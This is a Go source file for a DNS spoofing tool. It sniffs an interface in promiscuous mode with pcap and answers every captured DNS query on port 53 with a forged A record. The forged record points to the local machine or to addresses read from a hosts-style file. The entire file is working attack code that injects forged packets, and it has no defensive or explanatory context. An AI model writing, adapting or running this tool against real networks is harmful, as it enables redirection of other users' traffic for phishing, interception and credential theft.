package main

import (
	"bufio"
	"flag"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"log"
	"net"
	"os"
	"strings"
)

var (
	handle      *pcap.Handle
	err         error
	device      string
	macAddress  net.HardwareAddr
	localIp     net.IP
	fileDnsMap  bool
	dnsMap      map[string]string
	snapshotLen int32 = 1024
	promiscuous       = true
	buffer      gopacket.SerializeBuffer
	options     gopacket.SerializeOptions
)

func main() {
	//Input Command line arguments
	inputDevice := flag.String("i", "", "a string")
	inputFile := flag.String("f", "", "a string")

	flag.Parse()
	filter := strings.Join(flag.Args(), " ")

	// Check if input device is provided
	device = *inputDevice
	if device == "" {
		// If not present, then fall back to default device which is the first device
		device = firstDevice()
		log.Println("No custom input source provided. Choosing default network interface : ", device)
	} else if !deviceExists(device) {
		// Checking above if input device is valid
		log.Fatal("Unable to find network device :", *inputDevice)
	}
	netInterface, err := net.InterfaceByName(device)
	macAddress = netInterface.HardwareAddr

	handle, err = pcap.OpenLive(device, snapshotLen, promiscuous, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	// First check if read from file flag is present
	fileDnsMap = false
	if *inputFile != "" {
		fileDnsMap = true
		dnsMap = readHostsFromFile(*inputFile)
	}

	setBPFFilter(filter)
	//Iterate over all packets and print them
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		if isDNSPacket(packet) {
			createResponsePacket(packet, handle)
		}
	}
}

func createResponsePacket(packet gopacket.Packet, handle *pcap.Handle) {
	buffer = gopacket.NewSerializeBuffer()
	options = gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	dnsRequest, _ := packet.Layer(layers.LayerTypeDNS).(*layers.DNS)
	ethernetPacket := packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet)
	ipSrc, _ := packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
	udpSrc, _ := packet.Layer(layers.LayerTypeUDP).(*layers.UDP)

	var ip string
	var ok bool
	var parsedIp net.IP
	if !fileDnsMap {
		parsedIp = localIp
	} else {
		ip, ok = dnsMap[string(dnsRequest.Questions[0].Name)]
		if !ok {
			return
		}
		parsedIp, _, _ = net.ParseCIDR(ip + "/24")
	}

	dstPort := udpSrc.SrcPort
	srcPort := udpSrc.DstPort
	udpSrc.DstPort = dstPort
	udpSrc.SrcPort = srcPort

	dstIp := ipSrc.SrcIP
	srcIp := ipSrc.DstIP
	ipSrc.DstIP = dstIp
	ipSrc.SrcIP = srcIp

	dstMac := ethernetPacket.SrcMAC
	ethernetPacket.DstMAC = dstMac
	ethernetPacket.SrcMAC = macAddress

	dnsResponse := dnsRequest
	dnsResponse.QR = true
	dnsResponse.RA = true
	var dnsAnswer layers.DNSResourceRecord
	dnsAnswer.Name = []byte(dnsRequest.Questions[0].Name)
	dnsAnswer.Type = layers.DNSTypeA
	dnsAnswer.Class = layers.DNSClassIN

	dnsAnswer.IP = parsedIp
	dnsAnswer.TTL = 60
	dnsResponse.ANCount = 1
	dnsResponse.Answers = append(dnsResponse.Answers, dnsAnswer)
	dnsResponse.ResponseCode = layers.DNSResponseCodeNoErr

	udpSrc.SetNetworkLayerForChecksum(ipSrc)
	gopacket.SerializeLayers(buffer, options,
		ethernetPacket,
		ipSrc,
		udpSrc,
		dnsResponse,
	)
	outgoingPacket := buffer.Bytes()
	err = handle.WritePacketData(outgoingPacket)
	if err != nil {
		log.Fatal(err)
	}
}

func readHostsFromFile(path string) map[string]string {
	dnsMap := make(map[string]string)
	file, err := os.Open(path)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		words := strings.Fields(scanner.Text())
		dnsMap[words[1]] = words[0]
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	return dnsMap
}

func deviceExists(name string) bool {
	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Panic(err)
	}
	for _, device := range devices {
		if device.Name == name {
			localIp = device.Addresses[1].IP
			return true
		}
	}
	return false
}

func firstDevice() string {
	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Panic(err)
	}

	for _, device := range devices {
		if device.Addresses != nil {
			localIp = device.Addresses[1].IP
			return device.Name
		}
	}
	return ""
}

func isDNSPacket(packet gopacket.Packet) bool {
	var result = false
	udpLayer := packet.Layer(layers.LayerTypeUDP)
	if udpLayer != nil {
		udp, _ := udpLayer.(*layers.UDP)
		if udp.DstPort == 53 {
			result = true
		}
	}
	return result
}

func setBPFFilter(filter string) {
	//Applying BPF Filter to filter packets
	if filter != "" {
		if err := handle.SetBPFFilter(filter); err != nil {
			log.Fatal(err)
		}
	}
}
